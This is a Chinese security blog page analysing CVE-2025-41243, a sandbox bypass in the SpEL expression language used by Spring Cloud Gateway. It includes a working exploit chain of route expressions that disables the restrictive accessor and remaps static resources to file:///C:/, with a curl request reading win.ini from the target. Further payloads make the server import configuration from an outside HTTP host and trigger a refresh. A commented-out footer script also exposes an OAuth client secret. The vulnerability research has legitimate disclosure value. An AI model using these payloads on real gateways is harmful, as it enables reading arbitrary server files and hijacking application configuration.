<!DOCTYPE html>
<html>
  <head>
<meta name="referrer" content="never">
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-CNTF3L2LQC"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-CNTF3L2LQC');
</script>  <script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?a2d27f70a2f1f5f5edfb5884096627ae";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script> 
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="keywords" content="" />
    <meta name="description" content="" />
    
    <title>
      CVE-2025-41243  Spring Cloud Gateway SpEL 沙箱从任意属性访问到任意文件下载 - 白帽酱の博客
    </title>
    <link rel="manifest" href="/manifest.json" />
    <link rel="shortcut icon" href="/images/favicon.ico" type="image/x-icon" />
    
<link rel="stylesheet" href="/style/style.css">

  <meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="白帽酱の博客" type="application/atom+xml">
</head>
  <body>
    <canvas id='pagemap'></canvas>
    
    <div id="post-toc" class="animated hiddenToc hide">
      <span class="title">Toc</span>
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E"><span class="toc-text">历史漏洞</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%88%86%E6%9E%90"><span class="toc-text">修复分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9F%B3%E6%9A%97%E8%8A%B1%E6%98%8E"><span class="toc-text">柳暗花明</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-text">文件读取</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E9%87%8D%E8%BD%BD"><span class="toc-text">配置重载</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8E%9F%E7%94%9FRCE"><span class="toc-text">原生RCE?</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%93%E8%AF%AD"><span class="toc-text">结语</span></a></li></ol>
    </div>
    
    <div id="fixed-menu-wrap">
      <span class="iconfont icon-sousuo search-box menu-reset"></span>
      <span class="icon-toc menu-reset">Toc</span>
      <span class="iconfont icon-arrowup menu-reset"></span>
    </div>
    <div id="fixed-menu">
      <span class="iconfont icon-menu-"></span>
    </div>
    <div id="progress">
      <div class="line"></div>
    </div>
    <div id="search-shade" class="animated hiddenSearch hide">
      <div class="input-wrap">
        <span class="iconfont icon-sousuo search-box"></span>
        <input type="text" placeholder="Search" />
        <span class="iconfont icon-close"></span>
      </div>
      <div class="search-result">
        <div class="meta">
          <span><b id="result-count">0</b> results found</span>
          <img src="/images/logo.jpeg" />
        </div>
        <ul id="result-box"></ul>
      </div>
    </div>
    <div id="menu-mask" class="animated hideMenuMask hide">
      <span class="iconfont icon-close"></span>
      <div class="nav">
        
        <a href="/" class="">
          首页
        </a>
        
        <a href="/archives" class="">
          归档
        </a>
        
        <a href="/categories" class="">
          分类
        </a>
        
        <a href="/tags" class="">
          标签
        </a>
        
        <a href="/friends" class="">
          友链
        </a>
        
        <a href="/about" class="">
          关于
        </a>
        
      </div>
    </div>
    <div id="header">
      <div class="intro">
        <a href="/" class="logo" style="background-image: url('/images/logo.jpeg')"></a>
        <div class="author">白帽酱</div>
      </div>
      <div class="nav">
        <span class="iconfont icon-menu menu-icon"></span>
        <a href="#" class="search-box">
          <span class="iconfont icon-sousuo"></span>
        </a>
      </div>
    </div>
    <div id="side" class="animated bounceInLeft">
      <div class="shrink">
        <a href="/" class="logo" style="background-image: url('/images/logo.jpeg')"></a>
        <span class="iconfont icon-menu toggle-icon"></span>
        <a href="#" class="search-box">
          <span class="iconfont icon-sousuo"></span>
        </a>
      </div>
      <div class="magnify">
        <div class="about">
          <div class="author">白帽酱</div>
          <a href="/" class="logo" style="background-image: url('/images/logo.jpeg')"></a>
        </div>

        <div class="nav">
          
          <a href="/" class="">
            首页
          </a>
          
          <a href="/archives" class="">
            归档
          </a>
          
          <a href="/categories" class="">
            分类
          </a>
          
          <a href="/tags" class="">
            标签
          </a>
          
          <a href="/friends" class="">
            友链
          </a>
          
          <a href="/about" class="">
            关于
          </a>
          
          <a href="#" class="search-box">
            <span class="iconfont icon-sousuo"></span>
          </a>
        </div>
        <div class="bottom">
          <div class="follow">
            
            <a href="https://github.com/burpheart" target="_block">
              <span class="iconfont icon-github"></span>
            </a>
            
            <a href="https://twitter.com/burp_heart" target="_block">
              <span class="iconfont icon-twitter"></span>
            </a>
            
            <a href="https://space.bilibili.com/32890488" target="_block">
              <span class="iconfont icon-bilibili"></span>
            </a>
             
            <a href="/atom.xml" target="_block">
              <span class="iconfont icon-rss"></span>
            </a>
            
          </div>
        </div>
      </div>
    </div>
    <div id="container">
      <div class="main animated bounceInRight delay-0.7s">
        <article class="post-entry">
    <div class="header">
      
      <div class="title">CVE-2025-41243  Spring Cloud Gateway SpEL 沙箱从任意属性访问到任意文件下载</div>
      <div class="meta">
        <span class="item">
          <span class="iconfont icon-time-circle"></span>
          <span>2025/09/29</span>
        </span>

        

         
        <span class="item">
          <span class="iconfont icon-folder"></span>
          <span>
              
                
                  <a href="/categories/WEB">WEB</a>
                
              
          </span>
        </span>
        
        
         
          <span class="item">
            <span class="iconfont icon-tag1"></span>
            <span>
                
                  
                    <a href="/tags/WEB">WEB</a>
                  
                
            </span>
          </span>
         
      </div>
      <div>
      </div>
    </div>
    <html><head></head><body><h1 id="前言">前言<a class="post-anchor" href="#前言"></a></h1><p>最近，spring cloud getway 又出了一个10.0分的 SpEL漏洞</p>
<p>这个漏洞和之前的<a target="_blank" rel="noopener" href="https://spring.io/security/cve-2022-22947">CVE-2022-22947</a>漏洞一样 依然是在热更新路由时触发表达式执行</p>
<p>之前的漏洞不是已经修复的非常完美了吗，为什么还能继续利用呢？</p>
<span id="more"></span>
<h1 id="历史漏洞">历史漏洞<a class="post-anchor" href="#历史漏洞"></a></h1><p>在之前的修复方案中，原本使用的 <code>StandardEcalutionContext</code>上下文被替换成了一个新的 <code>SimpleEvaluationContext</code>上下文</p>
<figure class="highlight java"><table><tbody><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// org/springframework/cloud/gateway/support/ShortcutConfigurable.java</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">GatewayEvaluationContext</span><span class="hljs-params">(BeanFactory beanFactory)</span> </span>{<br>    <span class="hljs-keyword">this</span>.beanFactoryResolver = <span class="hljs-keyword">new</span> BeanFactoryResolver(beanFactory);<br>    Environment env = beanFactory.getBean(Environment.class);<br>    <span class="hljs-keyword">boolean</span> restrictive = env.getProperty(<br>        <span class="hljs-string">"spring.cloud.gateway.server.webflux.restrictive-property-accessor.enabled"</span>, Boolean.class, <span class="hljs-keyword">true</span>);<br>    <span class="hljs-keyword">if</span> (restrictive) {<br>        delegate = SimpleEvaluationContext.forPropertyAccessors(<span class="hljs-keyword">new</span> RestrictivePropertyAccessor())<br>        .withMethodResolvers((context, targetObject, name, argumentTypes) -&gt; <span class="hljs-keyword">null</span>)<br>        .build();<br>    }<br>    <span class="hljs-keyword">else</span> {<br>        delegate = SimpleEvaluationContext.forReadOnlyDataBinding().build();<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure>

<p>这个新上下文有着非常多的限制 ：</p>
<ol>
<li><code>getBeanResolver</code> 返回了null  不能访问任何bean</li>
<li><code>getTypeConverter</code>返回了一个 <code>typeNotFoundTypeLocator</code> 获取任何类型都会失败</li>
<li><code>methodResolver</code> 和  <code>propertyAccessors</code> 则由外部提供</li>
</ol>
<p>好在<code>ShortcutConfigurable</code>并不是把所有的方法都委派给了 <code>SimpleEvaluationConte</code></p>
<p><code>beanFactoryResolver</code>仍然是可用的 但是 <code>RestrictivePropertyAccessor</code>限制了属性的读取</p>
<p>现在，修复后的SpEL 只能进行bean属性的受限写访问，和一些基本的内置语法操作</p>
<h1 id="修复分析">修复分析<a class="post-anchor" href="#修复分析"></a></h1><figure class="highlight java"><table><tbody><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Test</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">testNormalizeDefaultTypeWithSpelAssignmentAndInvalidInputFails</span><span class="hljs-params">()</span> </span>{<br>	parser = <span class="hljs-keyword">new</span> SpelExpressionParser();<br>	ShortcutConfigurable shortcutConfigurable = <span class="hljs-keyword">new</span> ShortcutConfigurable() {<br>		<span class="hljs-meta">@Override</span><br>		<span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;String&gt; <span class="hljs-title">shortcutFieldOrder</span><span class="hljs-params">()</span> </span>{<br>			<span class="hljs-keyword">return</span> Arrays.asList(<span class="hljs-string">"bean"</span>, <span class="hljs-string">"arg1"</span>);<br>		}<br>	};<br>	Map&lt;String, String&gt; args = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>	args.put(<span class="hljs-string">"bean"</span>, <span class="hljs-string">"#{ @myMap['my.flag'] = true}"</span>);<br>	args.put(<span class="hljs-string">"arg1"</span>, <span class="hljs-string">"val1"</span>);<br>	assertThatThrownBy(() -&gt; {<br>		ShortcutType.DEFAULT.normalize(args, shortcutConfigurable, parser, <span class="hljs-keyword">this</span>.beanFactory);<br>	}).isInstanceOf(SpelEvaluationException.class);<br>}<br></code></pre></td></tr></tbody></table></figure>

<p>从新的<a target="_blank" rel="noopener" href="https://github.com/spring-cloud/spring-cloud-gateway/commit/b957599edcb26107d0e16d2675f7139a2be4d996">补丁</a>和其中的测试用例不难发现，在新漏洞的修复方案中<code>SimpleEvaluationContext</code>加了一个新的限制<code>.withAssignmentDisabled()</code> 这禁用了所有赋值表达式操作</p>
<p>这里有一个<code>SpEl</code>特性<code>@myMap['my.flag'].abc</code> <code>@myMap.abc</code> 会被属性访问限制读取</p>
<p><code>@myMap['my.flag']</code> <code>@myMap</code>  但是这种访问并不会受到属性绑定的访问限制 </p>
<p> 也就是说Bean Map是可以任意读写的 这里很容易想到 <code>systemProperties</code> 和 <code>systemEnvironment</code>两个 map 储存了spring的环境变量配置 </p>
<p><code>#{@systemProperties['spring.cloud.gateway.restrictive-property-accessor.enabled'] = 'false'}</code></p>
<p>通过这种表达式设置环境变量后 可以部分禁用刚刚的安全选项</p>
<p>但禁用这个安全选项后，情况也没有好太多</p>
<p>属性的读取限制解除了，但属性的写入又被限制住了，其他的限制仍然没有解除 =.= 非常头疼</p>
<p>另外 <code>spring cloud gateway</code>使用的WEB框架是<code>WebFlux</code>而不是传统的 <code>Web MVC</code></p>
<p><code>h2-console</code>这种通过动态注册<code>Servlet</code> 的应用在这种环境下无法正常工作</p>
<p> <code>WebFlux</code> 并不支持<code>Servlet</code>  而且大部分配置无法自动触发更新 基本没有用处</p>
<p>那 SpEL 赋值表达式怎么做才能实现代码执行呢？</p>
<h1 id="柳暗花明">柳暗花明<a class="post-anchor" href="#柳暗花明"></a></h1><p>我通过仔细跟踪SpEL的执行流程有了一些新的发现</p>
<figure class="highlight java"><table><tbody><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//org.springframework.expression.spel.support.ReflectivePropertyAccessor</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> TypedValue <span class="hljs-title">read</span><span class="hljs-params">(EvaluationContext context, <span class="hljs-meta">@Nullable</span> Object target, String name)</span> <span class="hljs-keyword">throws</span> AccessException </span>{<br> Object value;<br> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.member <span class="hljs-keyword">instanceof</span> Method) {<br>     Method method = (Method)<span class="hljs-keyword">this</span>.member;<br><br>     <span class="hljs-keyword">try</span> {<br>         ReflectionUtils.makeAccessible(method);<br>         value = method.invoke(target);<br>         <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> TypedValue(value, <span class="hljs-keyword">this</span>.typeDescriptor.narrow(value));<br>     } <span class="hljs-keyword">catch</span> (Exception var6) {<br>         <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> AccessException(<span class="hljs-string">"Unable to access property '"</span> + name + <span class="hljs-string">"' through getter method"</span>, var6);<br>     }<br> } <span class="hljs-keyword">else</span> {<br>     Field field = (Field)<span class="hljs-keyword">this</span>.member;<br><br>     <span class="hljs-keyword">try</span> {<br>         ReflectionUtils.makeAccessible(field);<br>         value = field.get(target);<br>         <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> TypedValue(value, <span class="hljs-keyword">this</span>.typeDescriptor.narrow(value));<br>     } <span class="hljs-keyword">catch</span> (Exception var7) {<br>         <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> AccessException(<span class="hljs-string">"Unable to access field '"</span> + name + <span class="hljs-string">"'"</span>, var7);<br>     }<br> }<br>}<br></code></pre></td></tr></tbody></table></figure>

<p>SpEL的的属性访问操作 最终是通过ReflectivePropertyAccessor类进行的</p>
<p>除了传统的反射读取属性外 它还支持通过调用方法来获取返回值 这里的预期设计应该是为了访问 <code>getter</code>方法</p>
<figure class="highlight java"><table><tbody><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//org.springframework.expression.spel.support.ReflectivePropertyAccessor#findGetterForProperty(java.lang.String, java.lang.Class&lt;?&gt;, boolean)</span><br><span class="hljs-meta">@Nullable</span><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> Method <span class="hljs-title">findGetterForProperty</span><span class="hljs-params">(String propertyName, Class&lt;?&gt; clazz, <span class="hljs-keyword">boolean</span> mustBeStatic)</span> </span>{<br>        Method method = <span class="hljs-keyword">this</span>.findMethodForProperty(<span class="hljs-keyword">this</span>.getPropertyMethodSuffixes(propertyName), <span class="hljs-string">"get"</span>, clazz, mustBeStatic, <span class="hljs-number">0</span>, ANY_TYPES);<br>        <span class="hljs-keyword">if</span> (method == <span class="hljs-keyword">null</span>) {<br>            method = <span class="hljs-keyword">this</span>.findMethodForProperty(<span class="hljs-keyword">this</span>.getPropertyMethodSuffixes(propertyName), <span class="hljs-string">"is"</span>, clazz, mustBeStatic, <span class="hljs-number">0</span>, BOOLEAN_TYPES);<br>            <span class="hljs-keyword">if</span> (method == <span class="hljs-keyword">null</span>) {<br>                method = <span class="hljs-keyword">this</span>.findMethodForProperty(<span class="hljs-keyword">new</span> String[]{propertyName}, <span class="hljs-string">""</span>, clazz, mustBeStatic, <span class="hljs-number">0</span>, ANY_TYPES);<br>            }<br>        }<br><br>        <span class="hljs-keyword">return</span> method;<br>    }<br></code></pre></td></tr></tbody></table></figure>

<p>我们继续往上游看<code>findGetterForProperty</code>负责把属性名解析成 <code>getter</code>方法。</p>
<p>在这里的实现居然使用的是属性名作为方法名兜底</p>
<p>也就是说 我们现在有了一个可以调用任意无参公开方法的能力 !!!!!!!!</p>
<h1 id="文件读取">文件读取<a class="post-anchor" href="#文件读取"></a></h1><p>spring getway 内置的<code>bean</code>有几百个，我稍微过了一遍<code>bean</code>的名称</p>
<p>很快就发现一个有趣的东西 <code>resourceHandlerMapping</code></p>
<p>它对应<code>SimpleUrlHandlerMapping</code>储存了静态资源的maping</p>
<p>通过调试 发现它的 <code>urlMap</code>属性储存了静态资源映射列表  而且存在对应的getter</p>
<figure class="highlight java"><table><tbody><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">this</span>.urlMap = {LinkedHashMap@<span class="hljs-number">12122</span>}  size = <span class="hljs-number">2</span><br> <span class="hljs-string">"/webjars/**"</span> -&gt; {ResourceWebHandler@<span class="hljs-number">9959</span>} <span class="hljs-string">"ResourceWebHandler [classpath [META-INF/resources/webjars/]]"</span><br> <span class="hljs-string">"/**"</span> -&gt; {ResourceWebHandler@<span class="hljs-number">12335</span>} <span class="hljs-string">"ResourceWebHandler [classpath [META-INF/resources/], classpath [resources/], classpath [static/], classpath [public/]]"</span><br></code></pre></td></tr></tbody></table></figure>

<p>直接尝试通过表达式修改文件映射列表 不出意外的话它不会生效</p>
<p><code>@resourceHandlerMapping.urlMap['/webjars/**'].locationValues[0]='file:///C:/'</code></p>
<p>因为他已经初始化过了 实际上使用的<code>locationsToUse</code>这个属性 它不是一个基本类型  不好修改啊</p>
<figure class="highlight java"><table><tbody><tr><td class="code"><pre><code class="hljs java">locationsToUse = {ArrayList@<span class="hljs-number">10090</span>}  size = <span class="hljs-number">1</span><br> <span class="hljs-number">0</span> = {ClassPathResource@<span class="hljs-number">12374</span>} <span class="hljs-string">"class path resource [META-INF/resources/webjars/]"</span><br>  path = <span class="hljs-string">"META-INF/resources/webjars/"</span><br>  classLoader = {RestartClassLoader@<span class="hljs-number">12377</span>} <br>  clazz = <span class="hljs-keyword">null</span><br></code></pre></td></tr></tbody></table></figure>

<p> 好在<code>ResourceWebHandler</code>刚好有一个静态方法 <code>afterPropertiesSet</code></p>
<figure class="highlight java"><table><tbody><tr><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">afterPropertiesSet</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception </span>{<br>       <span class="hljs-keyword">this</span>.resolveResourceLocations();<br>       <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.resourceResolvers.isEmpty()) {<br>           <span class="hljs-keyword">this</span>.resourceResolvers.add(<span class="hljs-keyword">new</span> PathResourceResolver());<br>       }<br><br>       <span class="hljs-keyword">this</span>.initAllowedLocations();<br>       <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.getResourceHttpMessageWriter() == <span class="hljs-keyword">null</span>) {<br>           <span class="hljs-keyword">this</span>.resourceHttpMessageWriter = <span class="hljs-keyword">new</span> ResourceHttpMessageWriter();<br>       }<br><br>       <span class="hljs-keyword">this</span>.resolverChain = <span class="hljs-keyword">new</span> DefaultResourceResolverChain(<span class="hljs-keyword">this</span>.resourceResolvers);<br>       <span class="hljs-keyword">this</span>.transformerChain = <span class="hljs-keyword">new</span> DefaultResourceTransformerChain(<span class="hljs-keyword">this</span>.resolverChain, <span class="hljs-keyword">this</span>.resourceTransformers);<br>   }<br>   <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">resolveResourceLocations</span><span class="hljs-params">()</span> </span>{<br>       List&lt;Resource&gt; result = <span class="hljs-keyword">new</span> ArrayList(<span class="hljs-keyword">this</span>.locationResources);<br>       <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">this</span>.locationValues.isEmpty()) {<br>           Assert.notNull(<span class="hljs-keyword">this</span>.resourceLoader, <span class="hljs-string">"ResourceLoader is required when \"locationValues\" are configured."</span>);<br>           Assert.isTrue(CollectionUtils.isEmpty(<span class="hljs-keyword">this</span>.locationResources), <span class="hljs-string">"Please set either Resource-based \"locations\" or String-based \"locationValues\", but not both."</span>);<br>           Iterator var2 = <span class="hljs-keyword">this</span>.locationValues.iterator();<br><br>           <span class="hljs-keyword">while</span>(var2.hasNext()) {<br>               String location = (String)var2.next();<br>               ((List)result).add(<span class="hljs-keyword">this</span>.resourceLoader.getResource(location));<br>           }<br>       }<br><br>       <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.isOptimizeLocations()) {<br>           result = (List)((List)result).stream().filter(Resource::exists).collect(Collectors.toList());<br>       }<br><br>       <span class="hljs-keyword">this</span>.locationsToUse.clear();<br>       <span class="hljs-keyword">this</span>.locationsToUse.addAll((Collection)result);<br>   }<br></code></pre></td></tr></tbody></table></figure>



<p>它通过调用<code>resolveResourceLocations</code>重新设置了<code>locationsToUse</code></p>
<p>到这里我们有了一个完整的利用链</p>
<ol>
<li>通过bean map 禁用安全限制</li>
</ol>
<p><code>#{@systemProperties['spring.cloud.gateway.restrictive-property-accessor.enabled'] = 'false'}"</code></p>
<ol start="2">
<li>覆盖属性替换路由</li>
</ol>
<p><code>#{ @resourceHandlerMapping.urlMap['/webjars/**'].locationValues[0]='file:///C:/'}"</code></p>
<ol start="3">
<li>setter 触发无参静态方法刷新配置</li>
</ol>
<p><code>#{ @resourceHandlerMapping.urlMap['/webjars/**'].afterPropertiesSet}"</code></p>
<figure class="highlight java"><table><tbody><tr><td class="code"><pre><code class="hljs java">curl http:<span class="hljs-comment">//127.0.0.1:8080/webjars/Windows/win.ini</span><br><br>; <span class="hljs-keyword">for</span> <span class="hljs-number">16</span>-bit app support<br>[fonts]<br>[extensions]<br>[mci extensions]<br>.....<br></code></pre></td></tr></tbody></table></figure>

<p>成功了! 静态资源的路径被重写 现在我们可以访问目标服务器磁盘下的任何文件了</p>
<h1 id="配置重载">配置重载<a class="post-anchor" href="#配置重载"></a></h1><p>另一个 bean <code>refreshEndpoint</code> 同样吸引了我的注意力</p>
<p>果然不出所料，其中 <code>refresh</code> 方法可以实现配置刷新</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><code class="hljs plain">public Collection&lt;String&gt; refresh() {<br>    Set&lt;String&gt; keys = this.contextRefresher.refresh();<br>    return keys;<br>}<br></code></pre></td></tr></tbody></table></figure>

<p>设置一个从外部加载的配置</p>
<p><code>#{@systemProperties['spring.config.import'] = 'optional:http://127.0.0.1:1234/1.yml'}</code></p>
<p>尝试刷新配置</p>
<p><code>#{@refreshEndpoint.refresh'}</code> </p>
<p>结果发现spring内部开始死循环刷新</p>
<p>由于刷新时路由表达式也会重新执行 这导致了刷新配置死循环  23333 经典死循环重启</p>
<p>稍微修改一下 poc</p>
<p><code>#{@systemProperties['okkk'] != 'true' ? (@systemProperties['okkk'] = 'true') + @refreshEndpoint.refresh : 'ok'}</code></p>
<p>这里通过一个设置自定义系统属性，来避免配置循环加载</p>
<p>第一次执行表达式会将 okkk 属性设置为 true</p>
<p>下次表达式执行时 三元表达式会避免二次执行refresh 来防止死循环刷新</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><code class="hljs plain">::ffff:127.0.0.1 - - [17/Sep/2025 23:02:41] "GET /1.yml HTTP/1.1" 200 -<br>::ffff:127.0.0.1 - - [17/Sep/2025 23:03:06] "HEAD /1.yml HTTP/1.1" 200 -<br></code></pre></td></tr></tbody></table></figure>

<p>spring配置文件成功的重载了 </p>
<p>但是高版本spring boot已经使用了安全的yaml反序列化环境来加载配置文件 所以无法执行命令</p>
<p>随后我尝试了设置<code>logging.config</code> 来触发logback的远程配置载入</p>
<p><code>#{@systemProperties['logging.config'] = 'http://127.0.0.1/abc.xml'}</code></p>
<p>刷新配置后没有事情发生 看起来logback的不会随着热刷新而重新触发初始化 这条路看起来也不行</p>
<h1 id="原生RCE">原生RCE?<a class="post-anchor" href="#原生RCE"></a></h1><p><code>spring.cloud.gateway.discovery.locator</code> 这个bean也有点意思</p>
<figure class="highlight yaml"><table><tbody><tr><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">spring:</span><br>  <span class="hljs-attr">application:</span><br>    <span class="hljs-attr">name:</span> <span class="hljs-string">demo-service</span><br>  <span class="hljs-attr">cloud:</span><br>    <span class="hljs-attr">nacos:</span><br>      <span class="hljs-attr">discovery:</span><br>        <span class="hljs-attr">server-addr:</span> <span class="hljs-string">localhost:8848</span><br>    <span class="hljs-attr">gateway:</span><br>      <span class="hljs-attr">discovery:</span><br>        <span class="hljs-attr">locator:</span><br>          <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span><br></code></pre></td></tr></tbody></table></figure>

<p>开启spring 注册中心 +  discovery locator 后 <code>urlExpression</code>和 <code>includeExpression</code>这两个有setter的属性在路由注册解析时会被当做SpEL表达式执行</p>
<figure class="highlight java"><table><tbody><tr><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-title">DiscoveryClientRouteDefinitionLocator</span><span class="hljs-params">(String discoveryClientName, DiscoveryLocatorProperties properties)</span> </span>{<br>    <span class="hljs-keyword">this</span>.properties = properties;<br>    <span class="hljs-keyword">if</span> (StringUtils.hasText(properties.getRouteIdPrefix())) {<br>        <span class="hljs-keyword">this</span>.routeIdPrefix = properties.getRouteIdPrefix();<br>    } <span class="hljs-keyword">else</span> {<br>        <span class="hljs-keyword">this</span>.routeIdPrefix = discoveryClientName + <span class="hljs-string">"_"</span>;<br>    }<br><br>    <span class="hljs-keyword">this</span>.evalCtxt = SimpleEvaluationContext.forReadOnlyDataBinding().withInstanceMethods().build();<br>}<br></code></pre></td></tr></tbody></table></figure>

<p>它的上下文则是另外一幅场景 <code>forReadOnlyDataBinding</code>+ <code>withInstanceMethods</code>  </p>
<p>虽然它可以执行任意公开方法了 但是仍然不能获取类型 甚至连访问bean都不可以</p>
<h1 id="结语">结语<a class="post-anchor" href="#结语"></a></h1><p>这个漏洞过去了几周都没有几个好的分析文章，就连<a target="_blank" rel="noopener" href="https://blog.z3r.ru/posts/spring-cloud-gateway-spel-vuln/">漏洞作者</a>在之后只给出了DoS和配置读取的利用</p>
<p>折腾了几天也没有看到哪里可以RCE的地方，也许真的会有 ？</p>
</body></html>

  
  <div class="post-guide">
    <div class="item left">
        
    </div>
    <div class="item right">
        
          <a href="/2025/07/08/ComfyUIRCE/">从一个废弃AI工作流平台拿下生产网 记SRC中的一次 ComfyUI comfy_mtb 插件 RCE</a>
        
    </div>
  </div>

  

  <div class="post-copyright">
    <div class="auth">
      本文作者：<a href="https://rce.moe">白帽酱</a>
    </div>
    <div class="link">
      永久链接：<a href="https://rce.moe/2025/09/29/CVE-2025-41243/">https://rce.moe/2025/09/29/CVE-2025-41243/</a>
    </div>
    <div class="declare">
      版权声明：本文首发于<a href="https://rce.moe">白帽酱</a>的博客，转载请注明出处！
    </div>
  </div>

  <div id="comment"></div>

  
  
</article>
<!--<div id="gitalk-container"></div>-->
<!--<link rel="stylesheet" href="https://unpkg.com/gitalk@latest/dist/gitalk.css">-->
<!--<script src="https://unpkg.com/gitalk@latest/dist/gitalk.min.js"></script>-->
<!--<script src="https://priesttomb.github.io/js/md5.min.js"></script>-->
<!--
<script type="text/javascript">
    new Gitalk({
        clientID: '1488ae49eda310270a91',
        clientSecret: '83e505f36d0351b0ef1a225d089546cb40ecd31a',
        repo: 'hexoblog',
        owner: 'burpheart',
        admin: 'burpheart',
        id: md5(location.pathname),
        distractionFreeMode: true,
        proxy: 'https://servelesscors.rce.moe/api/cors?url=https://github.com/login/oauth/access_token'
    }).render('gitalk-container')
-->
<div id="tcomment"></div>
<script src="https://cdn.jsdelivr.net/npm/twikoo@1.6.41/dist/twikoo.all.min.js"></script>
<script>
twikoo.init({
  envId: 'https://twikoo.rce.moe', // 腾讯云环境填 envId；Vercel 环境填地址（https://xxx.vercel.app）
  el: '#tcomment', // 容器元素
  // region: 'ap-guangzhou', // 环境地域，默认为 ap-shanghai，腾讯云环境填 ap-shanghai 或 ap-guangzhou；Vercel 环境不填
  // path: location.pathname, // 用于区分不同文章的自定义 js 路径，如果您的文章路径不是 location.pathname，需传此参数
  // lang: 'zh-CN', // 用于手动设定评论区语言，支持的语言列表 https://github.com/twikoojs/twikoo/blob/main/src/client/utils/i18n/index.js
})
</script>
</script>
        <footer>
          <div class="copyright">
            ©2025
            <a href="https://rce.moe">白帽酱</a> Powered by <a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a> |
            <a target="_blank" rel="noopener" href="https://github.com/shixiaohu2206/hexo-theme-huhu">hexo-theme-huhu</a>
          </div>
          
        </footer>
      </div>
    </div>
  </body>
  
</html>
<script type="text/javascript">
                  window.HUHU_CONFIG = JSON.parse("{\"share\":[\"weibo\",\"weixin\",\"qqkongjian\",\"QQ\",\"douban\",\"facebook\",\"twitter\",\"google\"],\"service_worker\":{\"open\":false}}")
                </script> <script type="text/javascript">window.addEventListener('load', function() {
    
    window.loadJs = function(d, m, a) {
      var c = document.getElementsByTagName('head')[0] || document.head || document.documentElement
      var b = document.createElement('script')
      b.defer = true
      b.setAttribute('type', 'text/javascript')
      b.setAttribute('charset', 'UTF-8')
      b.setAttribute('async', 'true')
      b.setAttribute('src', d)
      m && b.setAttribute('data-main', '/scripts/app-built')
      if (typeof a === 'function') {
        if (window.attachEvent) {
          b.onreadystatechange = function() {
            var e = b.readyState
            if (e === 'loaded' || e === 'complete') {
              b.onreadystatechange = null
              a()
            }
          }
        } else {
          b.onload = a
        }
      }
      c.appendChild(b)
    }
    window.loadJs && window.loadJs('https://cdn.bootcss.com/require.js/2.3.6/require.min.js', true, function() 